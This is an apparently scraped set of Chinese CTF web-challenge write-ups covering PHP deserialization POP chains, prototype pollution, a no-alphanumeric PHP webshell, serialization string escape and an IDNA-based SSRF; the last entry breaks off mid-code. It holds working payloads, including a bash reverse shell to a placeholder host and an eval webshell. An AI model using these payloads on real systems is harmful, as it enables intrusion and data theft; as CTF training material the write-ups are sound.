[{"title":"贵阳大数据及网络安全精英对抗赛WEB部分WP","url":"/post/232bb69.html","content":"\n贵阳大数据及网络安全精英对抗赛WEB部分WP\n\n<!--more-->\n\n# 仔细ping\n\n有点看不懂的一道题目，ip去ping，返回和我们本地ping网站差不多的回显，刚开始是以为用逻辑符`|``&&`之类的题目来做，后来发现想复杂了，他题目意思好像只能用他指定的命令，除此之外其他字符一律屏蔽\n\n比如 `?ip=ls`就可以合法，但是如果`?ip=l`一个字符也会被屏蔽，蛮nt的说实话。\n\npayload:`?id=ls`\n\n发现本地有flag.php\n\n直接 `?id=nl flag.php`\n\n# pop\n\n```php\n<?php\n  highlight_file(__FILE__);\nclass TT{\n  public $key;\n  public $c;\n  public function __destruct(){\n    echo $this->key;\n  }\n  \n  public function __toString(){\n    return \"welcome\";\n  }\n}\n\nclass JJ{\n  public $obj;\n  public function __toString(){\n    ($this -> obj)();\n    return \"1\";\n  }\n  public function evil($c){\n    eval($c);\n  }\n  public function __sleep(){\n    phpinfo();\n  }\n}\n\nclass MM{\n  public $name;\n  public $c;\n  public function __invoke(){\n    ($this->name)($this->c);\n  }\n  public function __toString(){\n    return \"ok,but wrong\";\n  }\n  public function __call($a, $b){\n    echo \"Hacker!\";\n  }\n}\n$a = unserialize($_GET['bbb']);\nthrow new Error(\"NoNoNo\");\n```\n\n整个链子其实不难 当时做这道题目 本地pop链已经写出来了 但是发现没法触发 \n\n```php\n<?php\nclass TT{\n    public $key;\n    public $c;\n}\n\n\nclass JJ{\n    public $obj;\n}\nclass MM{\n    public $name;\n    public $c;\n\n\n}\n$a = new TT();\n$a->key = new JJ();\n$a->key->obj=new MM();\n$a->key->obj->name ='system';\n$a->key->obj->c='cat /flag';\necho serialize($a);\n?>\n#O:2:\"TT\":2:{s:3:\"key\";O:2:\"JJ\":1:{s:3:\"obj\";O:2:\"MM\":2:{s:4:\"name\";s:6:\"system\";s:1:\"c\";s:9:\"cat /flag\";}}s:1:\"c\";N;}\n```\n\n然后就会发现`throw new Error(\"NoNoNo\");`会挡在前面没法绕过，当时就寄了。\n\n这里考到了fast destruct的知识点 出自：https://zhuanlan.zhihu.com/p/405838002\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683425847710-d16be9c0-ad73-4d77-a90b-d1ddc07075b6.png)\n\n其实原理还是蛮容易理解的，当一个对象生命周期结束时，最后就会触发析构函数，但是如果我们提前破坏这个序列化后的结构，那么就会提前进入析构函数\n\n这道题目就是因为`throw new Error(\"NoNoNo\");`而进不去我们构造的链子 但是如果我们破坏我们payload链子结构 那么就会提前进入析构函数 从而触发链子\n\npayload：`?bbb=O:2:\"TT\":2:{s:3:\"key\";O:2:\"JJ\":1:{s:3:\"obj\";O:2:\"MM\":2:{s:4:\"name\";s:6:\"system\";s:1:\"c\";s:6:\"whoami\";}}s:1:\"c\";N;}`\n\n这样是完整链子没法触发的我们可以删除最后一个`}`破坏结构让他提前进入析构函数\n\n```\n?bbb=O:2:\"TT\":2:{s:3:\"key\";O:2:\"JJ\":1:{s:3:\"obj\";O:2:\"MM\":2:{s:4:\"name\";s:6:\"system\";s:1:\"c\";s:6:\"whoami\";}}s:1:\"c\";N;\n```\n\n成功\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683426171520-63fa6be1-39b7-446d-8fc7-98f8d3e0a425.png)\n\n# 完美网站\n\n一道很臭的题目，大概题目思路是他给了一个img参数是一个图片格式base64编码 然后还需要提交一个n参数 但是n是一个10-30的随机数字 并且每次都不一样 那么其实思路很简单直接爆破就行了 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683427463745-906d989e-5129-4618-98ae-64fc1c6c5efb.jpeg)\n\n并且要同时提交img和n 但是这描述我也是无语\n\n然后当时没发现flag文件名藏在他给的img末尾是ffffpq.php  所以一直在找flag \n\n总之做的很恶心人 像吃了屎一样yue了\n\n# notrce\n\n好像我没记错应该是这道题目\n\n源码如下\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n$c=$_POST['c'];\nif(!preg_match(\"/vi|less|tail|head|od|sh|echo|touch|re|mv|rm|cat|ls|tac|more|cut|curl|wget|base|>|<|`|\\*|\\\\$|\\\\\\/i\",$c)){\n    exec($c);\n}else{\n    die(\"hacker\");\n}\n```\n\n蛮玄幻的一道题目 看了wp直接用将根目录flag复制到当前目录访问就行\n\n呢如果flag文件目录不是常规命名 这不就寄了吗\n\n# JUST_PROTO\n\n一道我未触及的领域的题目 一道nodejs的原型链污染题目\n\n这两天恶补了一下关于原型链污染的知识点，感受颇深\n\n如果之前了解过这个 其实题目一眼丁真就能看出是原型链污染的题目 `__proto__`明显就提示了\n\n给出源码：\n\n```javascript\nconst express = require('express');\nconst { exec } = require(\"child_process\");\nconst app = express();\napp.get('/', (req, res) => res.send('嗨嗨嗨！！老八来了！！！'));\n\nlet ba = {\n  baba: (token)=>{ return !!token },\n  bababa: ()=>{ if (JSON.stringify(date).length > 10000) date = {} }, \n  // set: `redis-cli -h ${ba.redis_host} set `\n  // get: `redis-cli -h ${ba.redis_host} get `\n};\n\nlet date = {};\n\napp.get('/set', (req, res) => {\n  ba.bababa(); \n  const {token, key, val} = req.query;\n  if (!ba.baba(token) || !val) return res.send(\"wrong\"); \n  date[token][key] = val; \n  res.json({ is_succ: true })\n});\n\napp.get('/get', (req, res) => {\n  const {token, key} = req.query;\n  if (!ba.baba(token)) return res.send(\"wrong\");\n  let result = date[token];\n  if (result) result = result[key];\n  res.json({ result: result === undefined ? \"null\" : result, is_succ: result !== undefined })\n});\n\n\napp.put('/bkup', (req, res) => {\n  let date_stream = Buffer.from(JSON.stringify(date)); \n  const cmd = ba.redis_set + `date ${date_stream.toString('base64')}`;\n  exec(cmd, (err,_,__) => {\n    if (err) return res.json({ is_succ: false });\n    res.json({ is_succ: true });\n  });\n});\n\napp.listen(8080, () => console.log(`嗨嗨嗨！！老八来了！！！`));\n\n\n//没敢吧所有变量名换成bababa 怕被打\n```\n\n先看/bkup路由\n\n```javascript\napp.put('/bkup', (req, res) => {\n  let date_stream = Buffer.from(JSON.stringify(date)); \n  const cmd = ba.redis_set + `date ${date_stream.toString('base64')}`;\n  exec(cmd, (err,_,__) => {\n    if (err) return res.json({ is_succ: false });\n    res.json({ is_succ: true });\n  });\n});\n```\n\n发现了我们最喜欢的exec()函数\n\n `const cmd = ba.redis_set + `date ${date_stream.toString('base64')}`;`\n\n然后这部分ba.redis_set如果我们可控则能达到rce\n\n再来看/set路由\n\n```javascript\napp.get('/set', (req, res) => {\n  ba.bababa(); \n  const {token, key, val} = req.query;\n  if (!ba.baba(token) || !val) return res.send(\"wrong\"); \n  date[token][key] = val; \n  res.json({ is_succ: true })\n});\n```\n\n通过get方式给`token,key,var`传参\n\n`date[token][key] = val;`因为三个参数我们都可控，则可以进行原型链污染\n\n这里解释一下为什么会是`data[token][key]`的形式，我们一般认为应该是`data.token.key`的形式\n\n其实这两种形式是相等的都可以\n\n比如ctfshow有题目的payload：\n\n原本是：`?eval=require('child_process').execSync('ls')`\n\n如果改为`?eval=require('child_process')['execSync']('ls')`那么都是可以的，两种都是等价的\n\n回到原题，使得`token=__proto__,key=redis_set,var=shell`\n\n则ba.redis_se被污染\n\n```\npayload:?token=__proto__&key=redis_set&var=bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'\n```\n\n其实直接`bash -i >& /dev/tcp/ip/port 0>&1`估计也是可以的 赛后没环境没法验证\n\n反弹shell部分用url编码一下\n\n`bash -c`就是将后面字符串当作命令读入执行 然后输出  \n\n# it’s time\n\n经典flask的ssti\n\n直接当个脚本小子，大脚本注入\n\n或者去找ctfshow 题目的payload都可以\n","tags":["Fast destruct","nodejs 原型链污染"],"categories":["贵阳大数据及网络安全精英对抗赛"]},{"title":"buuctf-67-[MRCTF2020]套娃","url":"/post/b79f6776.html","content":"\n[MRCTF2020]套娃\n\n<!--more-->\n\n进入题目 查看源码\n\n```cmake\n<!--\n//1st\n$query = $_SERVER['QUERY_STRING'];\n\n if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){\n    die('Y0u are So cutE!');\n}\n if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){\n    echo \"you are going to the next ~\";\n}\n!-->\n```\n\n分析：输入的字符串不能有`_`和其url编码，并且get传参b_u_p_t不能等于23333 但是正则匹配需要开头和结尾为23333\n\n这里用到了php合法变量名的知识点，如果在传参时，遇到不合法的变量名比如`.`则php会自动将其转为`_`\n\n正则匹配preg_match()通过换行符`%0a`绕过即可  在非多行模式下，$似乎会忽略在句尾的%0a\n\n可参考https://www.cnblogs.com/20175211lyz/p/12198258.html\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362389224-9f93cdc0-b997-45e9-8f7f-626ec36b4db3.png)\n\npayload:`?b.u.p.t=23333%2a`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362539907-88b3cf13-c278-4b0f-8f7a-fc105d89bf4f.png)\n\n```\n/secrettw.php\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362573491-a422447e-dedc-437c-bfed-400642d8c01f.png)\n\n查看源码发现一段jsfuck编码 直接在console中输入就有回显了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362663557-fba897df-6aac-40fd-8941-3b7a8243c607.png)\n\n获得源码:\n\n```cmake\n<?php \nerror_reporting(0); \ninclude 'takeip.php';\nini_set('open_basedir','.'); \ninclude 'flag.php';\n\nif(isset($_POST['Merak'])){ \n    highlight_file(__FILE__); \n    die(); \n} \n\n\nfunction change($v){ \n    $v = base64_decode($v); \n    $re = ''; \n    for($i=0;$i<strlen($v);$i++){ \n        $re .= chr ( ord ($v[$i]) + $i*2 ); \n    } \n    return $re; \n}\necho 'Local access only!'.\"<br/>\";\n$ip = getIp();\nif($ip!='127.0.0.1')\necho \"Sorry,you don't have permission!  Your ip is :\".$ip;\nif($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){\necho \"Your REQUEST is:\".change($_GET['file']);\necho file_get_contents(change($_GET['file'])); }\n?>\n```\n\nip用 `Client-ip: 127.0.0.1`写在请求头，并且只能用这个\n\n到目前为止我也不知道 Client-ip xff Real-ip 这三个在不同题目下为什么不能互用的原因 有点阴间\n\n2333用data伪协议去传参\n\n我们要读的文件file会经过change函数改变 我们只需要倒着写一个change函数 让其进过题目函数时候回到我们想要的内容即可 脚本很简单\n\n```php\n<?php\nfunction change($v){ \n    $v = base64_decode($v); \n    $re = ''; \n    for($i=0;$i<strlen($v);$i++){ \n        $re .= chr ( ord ($v[$i]) + $i*2 ); \n    } \n    return $re; }\n$str = 'ZmxhZy5waHA=';   //Zm5lbTZ6dH4=\necho change($str)\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362979416-9100efcf-0951-4540-9a1b-a57509c7d87f.png)\n","tags":["php字符串解析特性"],"categories":["buuctf"]},{"title":"buuctf-66-[极客大挑战 2019]RCE ME","url":"/post/7f59ce0.html","content":"\n[极客大挑战 2019]RCE ME\n\n<!--more-->\n\n```cmake\n<?php\nerror_reporting(0);\nif(isset($_GET['code'])){\n            $code=$_GET['code'];\n                    if(strlen($code)>40){\n                                        die(\"This is too Long.\");\n                                                }\n                    if(preg_match(\"/[A-Za-z0-9]+/\",$code)){\n                                        die(\"NO.\");\n                                                }\n                    @eval($code);\n}\nelse{\n            highlight_file(__FILE__);\n}\n\n// ?>\n```\n\n\n\n这道题就是通过取反构造无数字字母rce的\n\n其实这种构造奇淫rce的 明白原理之后 直接当个脚本小子做起题来嘎嘎快\n\n生成脚本如下：\n\n```cmake\n<?php\n$ans1='assert';//函数名\n$ans2='eval($_POST[x])';//命令\n$data1=('~'.urlencode(~$ans1));//通过两次取反运算得到system\n$data2=('~'.urlencode(~$ans2));//通过两次取反运算得到dir\necho ('('.$data1.')'.'('.$data2.')'.';');\n?>\n```\n\n直接构造`system('ls')`发现不可以\n\n就很奇怪 构造`phpinfo()`找不到思路就去看看配置文件 这个真的很重要\n\npayload:`?code=(~%8F%97%8F%96%91%99%90)();`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683357622168-d10c216a-c463-4f40-847a-88eecc81c4a3.png)\n\n发现原来是好多函数被禁了 难怪执行不了\n\n构造`assert(eval($_POST[x]))`生成一句话木马用蚁剑去连接\n\n注意这种eval()中再嵌套一个assert(eval())的方式 有时候可以绕过waf\n\npayload: `?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%87%A2%D6);`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683358006276-a208a639-bd8a-4241-baa8-a5d4b64e4dcd.png)\n\n接下来的思路就是怎么绕过disble_function 具体方式可以看我这一篇文章 这里就不赘述了 https://z1d10t.github.io/post/db3afe26.html?highlight=disable\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683358035645-929e3eb1-fe11-4d92-bed9-0bc5497f90d0.png)\n","tags":["RCE奇淫方式"],"categories":["buuctf"]},{"title":"buuctf-64-[0CTF 2016]piapiapia","url":"/post/6e80c399.html","content":"\n[0CTF 2016]piapiapia\n\n<!--more-->\n\n一道php反序列化字符串逃逸的题目，需要代码审计，tql！\n\n## 捋清思路：\n\n首先注册一个账号，然后登录，发现有个文件上传地方，刚开始以为是传木马，然后去连，getshell但后面发现新大陆，一顿操作之后，发现需要扫网站，下载源码。\n\n下载下来6个php文件 \n\n在config.php中发现有flag 但是被删除了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683290000574-a5d69780-e1ec-48cc-a0f0-2351c7ced655.png)\n\n然后register.php与index.php都是一些基础的注册账号与登录账号的操作\n\n然后由index.php转向update.php\n\n也就是我们看到的这个界面\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683290165259-d39fb665-8660-42cc-9811-c6644e2aa4e0.png)\n\n```cmake\n//update.php\n<?php\n\trequire_once('class.php');\n\tif($_SESSION['username'] == null) {\n\t\tdie('Login First');\t\n\t}\n\tif($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {\n\n\t\t$username = $_SESSION['username'];\n\t\tif(!preg_match('/^\\d{11}$/', $_POST['phone']))\n\t\t\tdie('Invalid phone');\n\n\t\tif(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))\n\t\t\tdie('Invalid email');\n\t\t\n\t\tif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n\t\t\tdie('Invalid nickname');\n\n\t\t$file = $_FILES['photo'];\n\t\tif($file['size'] < 5 or $file['size'] > 1000000)\n\t\t\tdie('Photo size error');\n\n\t\tmove_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\n\t\t$profile['phone'] = $_POST['phone'];\n\t\t$profile['email'] = $_POST['email'];\n\t\t$profile['nickname'] = $_POST['nickname'];\n\t\t$profile['photo'] = 'upload/' . md5($file['name']);\n  \t\t//user是class.php中的user的一个对象\n\t\t$user->update_profile($username, serialize($profile)); //我们的用户名admin和profile以序列化字符串形式传过去的\n\t\techo 'Update Profile Success!<a href=\"profile.php\">Your Profile</a>';\n\t}\n\telse {\n?>\n```\n\n简单看一下就是通过post获取变量值，和一些简单的判断输入是否合法的语句，注意一下nickname(昵称)的判断\n\n```cmake\n\tif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n\t\t\tdie('Invalid nickname');\n```\n\nnickname不能超过10个字符，之后会提及\n\n然后传入update_profile() 这里`$profile`数组是我们通过序列化传入的，这里很重要\n\n```cmake\n$user->update_profile($username, serialize($profile)); //我们的用户名admin和profile以序列化字符串形式传过去的\n```\n\n之后传入class.php\n\n```cmake\n//class.php\n<?php\nrequire('config.php');\n\nclass user extends mysql{   //继承类的生成 mysql为父类 user为子类\n\tprivate $table = 'users';\n\n\tpublic function is_exists($username) {\n\t\t$username = parent::filter($username);\n\n\t\t$where = \"username = '$username'\";\n\t\treturn parent::select($this->table, $where);\n\t}\n\tpublic function register($username, $password) {\n\t\t$username = parent::filter($username);\n\t\t$password = parent::filter($password);\n\n\t\t$key_list = Array('username', 'password');\n\t\t$value_list = Array($username, md5($password));\n\t\treturn parent::insert($this->table, $key_list, $value_list);\n\t}\n\tpublic function login($username, $password) {\n\t\t$username = parent::filter($username);\n\t\t$password = parent::filter($password);\n\n\t\t$where = \"username = '$username'\";\n\t\t$object = parent::select($this->table, $where);\n\t\tif ($object && $object->password === md5($password)) {\n\t\t\treturn true;\n\t\t} else {\n\t\t\treturn false;\n\t\t}\n\n\t}\n\tpublic function show_profile($username) {\n\t\t$username = parent::filter($username);\n\n\t\t$where = \"username = '$username'\";\n\t\t$object = parent::select($this->table, $where);\n\t\treturn $object->profile;\n\t}\n\tpublic function update_profile($username, $new_profile) {\n\t\t$username = parent::filter($username);\n\t\t$new_profile = parent::filter($new_profile);\n\n\t\t$where = \"username = '$username'\";\n\t\treturn parent::update($this->table, 'profile', $new_profile, $where);\n\t}\n\tpublic function __tostring() {\n\t\treturn __class__;\n\t}\n}\n\nclass mysql {\n\tprivate $link = null;\n\n\tpublic function connect($config) {\n\t\t$this->link = mysql_connect(\n\t\t\t$config['hostname'],\n\t\t\t$config['username'], \n\t\t\t$config['password']\n\t\t);\n\t\tmysql_select_db($config['database']);\n\t\tmysql_query(\"SET sql_mode='strict_all_tables'\");\n\n\t\treturn $this->link;\n\t}\n\n\tpublic function select($table, $where, $ret = '*') {\n\t\t$sql = \"SELECT $ret FROM $table WHERE $where\";\n\t\t$result = mysql_query($sql, $this->link);\n\t\treturn mysql_fetch_object($result);\n\t}\n\n\tpublic function insert($table, $key_list, $value_list) {\n\t\t$key = implode(',', $key_list);\n\t\t$value = '\\'' . implode('\\',\\'', $value_list) . '\\''; \n\t\t$sql = \"INSERT INTO $table ($key) VALUES ($value)\";\n\t\treturn mysql_query($sql);\n\t}\n\n\tpublic function update($table, $key, $value, $where) {\n\t\t$sql = \"UPDATE $table SET $key = '$value' WHERE $where\";\n\t\treturn mysql_query($sql);\n\t}\n\n\tpublic function filter($string) {     //父类filer\n\t\t$escape = array('\\'', '\\\\\\\\');\n\t\t$escape = '/' . implode('|', $escape) . '/';\n\t\t$string = preg_replace($escape, '_', $string);  //一顿操作下来就是一个正则\n\n\t\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t\t$safe = '/' . implode('|', $safe) . '/i';\n\t\treturn preg_replace($safe, 'hacker', $string);\n\t}\n\tpublic function __tostring() {\n\t\treturn __class__;\n\t}\n}\nsession_start();\n$user = new user();\n$user->connect($config);\n```\n\n直接定位到update_profile函数\n\n```cmake\n\tpublic function update_profile($username, $new_profile) {\n\t\t$username = parent::filter($username);\n\t\t$new_profile = parent::filter($new_profile);\n```\n\n这里通过继承类，调用父类的filter函数\n\n```cmake\npublic function filter($string) {     //父类filer\n\t\t$escape = array('\\'', '\\\\\\\\');\n\t\t$escape = '/' . implode('|', $escape) . '/';\n\t\t$string = preg_replace($escape, '_', $string);  //一顿操作下来就是一个正则\n\n\t\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t\t$safe = '/' . implode('|', $safe) . '/i';\n\t\treturn preg_replace($safe, 'hacker', $string);\n\t}\n```\n\n这里相当于一个过滤器\n\n重点看第二个正则 如果我们传入的字符串有`'select', 'insert', 'update', 'delete', 'where'`则会被替换为`hacker`  至此暂时结束\n\n当我们上传完update.php需要的信息之后会跳入profile.php\n\n```cmake\n//profile.php\n<?php\n\trequire_once('class.php');\n\tif($_SESSION['username'] == null) {\n\t\tdie('Login First');\t\n\t}\n\t$username = $_SESSION['username'];\n\t$profile=$user->show_profile($username);\n\tif($profile  == null) {\n\t\theader('Location: update.php');\n\t}\n\telse {\n\t\t$profile = unserialize($profile);\n\t\t$phone = $profile['phone'];\n\t\t$email = $profile['email'];\n\t\t$nickname = $profile['nickname'];\n\t\t$photo = base64_encode(file_get_contents($profile['photo']));\n?>\n```\n\n这里终于看到了我们常见的漏洞点file_get_contents()函数\n\n先经过反序列化`$profile`数组\n\n然后base64编码读出`$profile['photo']`\n\n之前看到config.php中含有flag 那么我们可以让`$profile['photo']=config.php`不就可以拿到flag了\n\n## 解题：\n\n但是photo部分是文件上传部分，并不能直接让他等于config.php去拿到flag\n\n这里就要用到反序列化字符串逃逸了\n\n在整个过程中存在序列化与反序列化，我们可以在nickname部分构造出符合反序列化的字符串，在nickname存在config.php让其反序列化到后边的photo部分，相当于提前结束反序列化，让原本photo部分的反序列化部分丢失，从而达到使得`$profile['photo']=config.php`\n\n那么我们需要在nickname序列化后的部分塞入`\";s:5:\"photo\";s:10:\"config.php\";}`共33个字符\n\n这里构造合法反序列化部分很巧妙\n\n之前看代码它存在一个过滤器\n\n```cmake\n\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t\t$safe = '/' . implode('|', $safe) . '/i';\n\t\treturn preg_replace($safe, 'hacker', $string);\n```\n\n如果我们只是单纯把`\";s:5:\"photo\";s:10:\"config.php\";}`这一部分塞入nickname那么它经过序列化后，再经过反序列化全部部分还是属于nickname部分，我们就需要在他序列化后构造让他字符串溢出，然后溢出部分就会到photo部分\n\n我们可以让`nickname=where`然后序列化后经过过滤器where会被替换为hacker,where为5个字符，而hacker为6个字符，多出一个字符，就这样使得它在反序列时还是按照原本5个字符去反序列化，还有一个字符就溢出逃逸了。\n\n可以简单借助下面的脚本理解：\n\n```php\n<?php\nfunction filter($string) {     //父类filer\n    $escape = array('\\'', '\\\\\\\\');\n    $escape = '/' . implode('|', $escape) . '/';\n    $string = preg_replace($escape, '_', $string);  //一顿操作下来就是一个正则\n\n\n    $safe = array('select', 'insert', 'update', 'delete', 'where');\n    $safe = '/' . implode('|', $safe) . '/i';\n    return preg_replace($safe, 'hacker', $string);\n}\n$profile = array(\"phone\"=>\"12345678912\",\"email\"=>\"123@qq.com\",\"nickname\"=>\"where\",\"photo\"=>\"abc\");\n$a = serialize($profile);\necho $a;\necho \"\\n\";\necho filter($a);\n?>\n```\n\n输出：这里第二行hacker明明是6个字符但是在序列化字符串中还是显示5，那么多余出来的一个字符将会在反序列化过程中逃逸。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292442387-dfaaedff-1c6d-4dbc-a7bf-f889153b5ded.png)\n\n那么我们塞入字符串`\";s:5:\"photo\";s:10:\"config.php\";}`是33个字符，则需要33个where\n\n但是之前看到nickname部分不能超过10个字符\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292530703-ad1938a2-50bb-44cb-b17f-326547c2d3b9.png)\n\n这里可以通过数组方式绕开正则匹配即`nickename[]`\n\n这里`$profile`已经是一个数组了，如果数组里面再包含一个数组，那么序列化后的字符串稍有不同。\n\n通过一个脚本来帮助理解：\n\n```php\n<?php\n$a = array(\"name\"=>'Tom',\"age\"=>array(17));\necho serialize($a);\n?>\n```\n\n输出：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292655293-2cc8bf95-340a-4112-8ae9-dfd90f65fb8c.png)\n\n会有花括号去包裹数组中的数组部分，那么我们在闭合nickname这部分时也需要特意构造一个右花括号去闭合，使其成为合法反序列化部分。\n\n即`\";}s:5:\"photo\";s:10:\"config.php\";}`我们需要塞入34个字符\n\n那么nickname就需要有34个where\n\n```\nwherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";}\n```\n\n其他部分任意\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292841846-e07c45fe-820f-4146-9ee8-3ffd7c96068d.png)\n\n进入profile.php去解码这段base64\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292879095-67419a27-16e3-4ec0-857c-ebabf61f6e6f.png)\n\n就可以拿到flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292910852-9d761113-d1cd-4816-921d-e3b225f34f46.png)\n","tags":["反序列化","代码审计","反序列化字符串逃逸"],"categories":["buuctf"]},{"title":"buuctf-63-[SUCTF 2019]Pythonginx","url":"/post/487317b8.html","content":"\n[SUCTF 2019]Pythonginx\n\n<!--more-->\n\n一道关于python解析idna编码与utf-8解码后的字符串的漏洞题目\n\nCVE-2019-9636：urlsplit 不处理 NFKC 标准化\n\nCVE-2019-10160：urlsplit NFKD 标准化漏洞\n\n源码：\n\n```cmake\n@app.route('/getUrl', methods=['GET', 'POST'])\ndef getUrl():\n    url = request.args.get(\"url\")\n    host = parse.urlparse(url).hostname\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 111\"\n    parts = list(urlsplit(url))\n    host = parts[1]\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 222 \" + host\n    newhost = []\n    for h in host.split('.'):\n        newhost.append(h.encode('idna').decode('utf-8'))\n    parts[1] = '.'.join(newhost)\n    #去掉 url 中的空格\n    finalUrl = urlunsplit(parts).split(' ')[0]\n    host = parse.urlparse(finalUrl).hostname\n    if host == 'suctf.cc':\n        return urllib.request.urlopen(finalUrl).read()\n    else:\n        return \"我扌 your problem? 333\"\n   \n    <!-- Dont worry about the suctf.cc. Go on! -->\n    <!-- Do you know the nginx? -->\n```\n\n完整分析过程：\n\n```python\nfrom flask import Flask, Blueprint, request, Response, escape ,render_template\nfrom urllib.parse import urlsplit, urlunsplit, unquote\nfrom urllib import parse\nimport urllib.request\nurl =\"http://www.baidu.com/index.php\"\nhost = parse.urlparse(url).hostname #第一次host\nprint(\"第一次host:\",host)\nparts = list(urlsplit(url))\nprint(\"parts:\",parts)\nhost = parts[1]  #第二次host\nprint(\"第二次host:\",host)\nnewhost = []\nprint(\"以点分割：\",host.split('.')) #以.为分隔符返回一个列表\nfor h in host.split('.'):\n    newhost.append(h.encode('idna').decode('utf-8')) #漏洞产生点\nprint(\"经过idna编码与utf-8解码后newhost:\",newhost)\nparts[1] = '.'.join(newhost)\n#去掉 url 中的空格\nfinalUrl = urlunsplit(parts).split(' ')[0]\nhost = parse.urlparse(finalUrl).hostname  #第三次host\nprint(\"第三次host:\",host)\n```\n\n这里说说host与hostname吧\n\n `host=hostname+':'+port(not 80)`  \n\n 如果http使用默认的80端口，host可以省略掉冒号+端口，看上去和hostname一样 \n\n```\nhost = parse.urlparse(url).hostname\n```\n\n这一行获取我们的hostname 并且需要有协议才行 比如https://,http://,或者file://，这样才能获取到我们的hostname，也就是payload形式，必须也是这样包含协议的形式\n\n具体分割部分，可以去看官方手册https://docs.python.org/zh-cn/3/library/urllib.parse.html?highlight=urlsplit\n\n输出：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683210222158-baba3125-052f-4eae-b0eb-681f23c4953a.png)\n\n目标绕开第一第二个if，那么操作点就在这里\n\n```cmake\nfor h in host.split('.'):\n    newhost.append(h.encode('idna').decode('utf-8'))\n```\n\n比如` ℆ ` 这个字符经过以上操作之后就变为了c/u\n\n那么我们就可以让题目需要的`suctf.cc`改为`suctf.c ℆ `然后经过idna编码utf-8解码后，变为我们需要的suctf.cc/u\n\n还需要了解一些关于nginx的重要文件位置：\n\n- 配置文件存放目录：/etc/nginx\n- 主配置文件：/etc/nginx/conf/nginx.conf\n- 管理脚本：/usr/lib64/systemd/system/nginx.service\n- 模块：/usr/lisb64/nginx/modules\n- 应用程序：/usr/sbin/nginx\n- 程序默认存放位置：/usr/share/nginx/html\n- 日志默认存放位置：/var/log/nginx\n- 配置文件目录为：/usr/local/nginx/conf/nginx.conf\n\n先来找flag文件的位置，看了wp\n\npayload:`?url=file://suctf.c℆sr/local/nginx/conf/nginx.conf`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683210794235-67212c4a-f398-4e90-9615-d84f0c656810.png)\n\n读就行了`?url=file://suctf.c℆sr/fffffflag`\n","tags":["python","nginx"],"categories":["buuctf"]},{"title":"buuctf-62-[BJDCTF2020]EasySearch","url":"/post/9c6e15d.html","content":"\n[BJDCTF2020]EasySearch\n\n<!--more-->\n\n扫网站后台，buu常常扫不出来算了，直接从网上扒一个\n\n发现有/index.php.swp\n\n源码如下：\n\n```cmake\n<?php\n\tob_start();\n\tfunction get_hash(){\n\t\t$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';\n\t\t$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times\n\t\t$content = uniqid().$random;\n\t\treturn sha1($content); \n\t}\n    header(\"Content-Type: text/html;charset=utf-8\");\n\t***\n    if(isset($_POST['username']) and $_POST['username'] != '' )\n    {\n        $admin = '6d0bc1';\n        if ( $admin == substr(md5($_POST['password']),0,6)) {\n            echo \"<script>alert('[+] Welcome to manage system')</script>\";\n            $file_shtml = \"public/\".get_hash().\".shtml\";\n            $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\");\n            $text = '\n            ***\n            ***\n            <h1>Hello,'.$_POST['username'].'</h1>\n            